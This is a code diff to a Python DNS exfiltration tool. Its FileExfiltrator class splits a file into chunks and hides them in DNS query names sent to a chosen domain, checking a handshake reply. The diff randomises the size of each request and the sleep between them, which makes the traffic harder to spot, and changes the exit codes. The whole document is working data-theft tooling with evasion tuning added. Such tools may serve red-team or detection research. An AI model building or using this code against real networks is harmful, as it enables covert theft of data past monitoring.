@@ -17,8 +17,8 @@ from utils import *
 
 MIN_TIME_SLEEP = None
 MAX_TIME_SLEEP = None
-MIN_BYTES_READ = None
-MAX_BYTES_READ = None
+MIN_SIZE_REQUEST = None
+MAX_SIZE_REQUEST = None
 
 class FileExfiltrator(threading.Thread):
     def __init__(self,file_to_send, args):
@@ -40,6 +40,9 @@ class FileExfiltrator(threading.Thread):
         return labels
 
     def run(self):
+        global MIN_TIME_SLEEP, MAX_TIME_SLEEP, MIN_SIZE_REQUEST, MAX_SIZE_REQUEST
+
+        random.seed(int(time.time()))
 
         try:
             # Verify if the file exists
@@ -111,7 +114,7 @@ class FileExfiltrator(threading.Thread):
             print("Timeout: No response received within the specified timeout.")
             print("Server unreachable")
             self.sock.close()
-            sys.exit(0)
+            sys.exit(1)
 
         reply = dnslib.DNSRecord.parse(response)
         #print(f"Received DNS response: {reply}")
@@ -120,14 +123,14 @@ class FileExfiltrator(threading.Thread):
         if reply.rr:
             # Parcourez chaque enregistrement de réponse
             for rr in reply.rr:
-                if str(rr.rdata).replace("\"", "") == "init":
+                if str(rr.rdata).replace("\"", "") == "hndshk":
                     print("Connection initialized")
                 else:
                     print("Wrong initialization response")
         else:
             print("The response does not contain any response records.")
             print("Wrong initialization response")
-            sys.exit(0)
+            sys.exit(1)
             
 
         
@@ -136,8 +139,24 @@ class FileExfiltrator(threading.Thread):
         while True:
             # Pattern: [sessionID].[chunk_index]. [...] .[domain]
             fixed_parts_size = len(self.sessionid) + len(str(chunk_index)) + len(self.domain) + 3
+            
+            if MIN_SIZE_REQUEST <= fixed_parts_size:
+                print('MIN_SIZE_REQUEST too small')
+                MIN_SIZE_REQUEST = fixed_parts_size + 1
 
-            remaining_size = 253 - fixed_parts_size
+            if MAX_SIZE_REQUEST > 253:
+                print('MAX_SIZE_REQUEST too big')
+                MAX_SIZE_REQUEST = 253
+            elif MAX_SIZE_REQUEST < MIN_SIZE_REQUEST:
+                MAX_SIZE_REQUEST = MIN_SIZE_REQUEST
+            
+            #MIN_BYTES_READ, MAX_BYTES_READ
+            print(MIN_SIZE_REQUEST)
+            print(MAX_SIZE_REQUEST)
+            random_size = random.randint(MIN_SIZE_REQUEST, MAX_SIZE_REQUEST)
+
+            remaining_size = random_size - fixed_parts_size
+            #remaining_size = 253 - fixed_parts_size
             #print(remaining_size)
             points = (remaining_size-1) // 63
             #print(points)
@@ -168,7 +187,7 @@ class FileExfiltrator(threading.Thread):
                 print("Timeout: No response received within the specified timeout.")
                 print("Server failure")
                 self.sock.close()
-                sys.exit(0)
+                sys.exit(1)
 
             reply = dnslib.DNSRecord.parse(response)
 
@@ -182,7 +201,7 @@ class FileExfiltrator(threading.Thread):
             else:
                 print("The response does not contain any response records.")
                 print("Wrong initialization response")
-                sys.exit(0)
+                sys.exit(1)
         
 
             time_to_sleep = random.uniform(MIN_TIME_SLEEP, MAX_TIME_SLEEP)
@@ -229,7 +248,7 @@ class FileExfiltrator(threading.Thread):
         else:
             print("The response does not contain any response records.")
             print("Wrong initialization response")
-            sys.exit(0)
+            sys.exit(1)
 
         #while True:
             #print("Thread for file {} is running...".format(self.file_to_send))
@@ -244,7 +263,7 @@ def signal_handler(sig, frame):
     sys.exit(0)
 
 def main():
-    global MIN_TIME_SLEEP, MAX_TIME_SLEEP, MIN_BYTES_READ, MAX_BYTES_READ
+    global MIN_TIME_SLEEP, MAX_TIME_SLEEP, MIN_SIZE_REQUEST, MAX_SIZE_REQUEST
 
     parser = argparse.ArgumentParser()
     parser.add_argument('-s', '--socket', action="store", dest="socket", default=None,
@@ -266,14 +285,14 @@ def main():
 
     MIN_TIME_SLEEP = int(config['minTimeSleep'])
     MAX_TIME_SLEEP = int(config['maxTimeSleep'])
-    MIN_BYTES_READ = int(config['minBytesRead'])
-    MAX_BYTES_READ = int(config['maxBytesRead'])
+    MIN_SIZE_REQUEST = int(config['minSizeRequest'])
+    MAX_SIZE_REQUEST = int(config['maxSizeRequest'])
 
     signal.signal(signal.SIGINT, signal_handler)
 
     if (args.file is None):
         parser.print_help()
-        sys.exit(-1)
+        sys.exit(1)
 
     else:
         files = list(set(args.file))
